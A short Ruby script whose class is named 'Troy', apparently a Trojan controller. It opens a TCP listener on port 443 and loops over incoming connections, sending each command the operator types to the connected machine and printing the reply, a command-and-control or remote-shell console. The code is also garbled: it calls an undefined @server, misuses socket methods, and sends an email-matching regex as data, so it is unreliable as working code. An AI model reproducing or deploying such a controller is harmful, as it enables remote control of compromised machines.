require "base64"
require "rbconfig"
require "socket"


class Troy

	def initialize(hostname, port)
	  @hostname = hostname
	  @port = port
	  @socket = UDPSocket.new
	end


	def serverConnect
        @socket = TCPSocket.open(@hostname, @port)
		@socket.puts("GET / HTTP/1.1\r\nHost: #{@hostname}\r\n\r\n")
	end

	def server
        @socket = UDPSocket.new
		@socket = TCPServer.new(@port, @hostname)
		@socket.send("^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$", 256, @hostname, @port)
	end

	def Main
    while true
      @session = @server.accept
      sock_domain, remote_port, remote_hostname, remote_ip = @session.client_peeraddr
      print("[+] #{remote_ip}: #{remote_port}: ")
      cmd = gets.chomp
      @session.send( cmd, 0)
       @data = @session.recv(4096)
      puts @data
    end
  end
end


troy = Troy.new("...", 443) # ... web ıp
troy.serverConnect
troy.server
troy.Main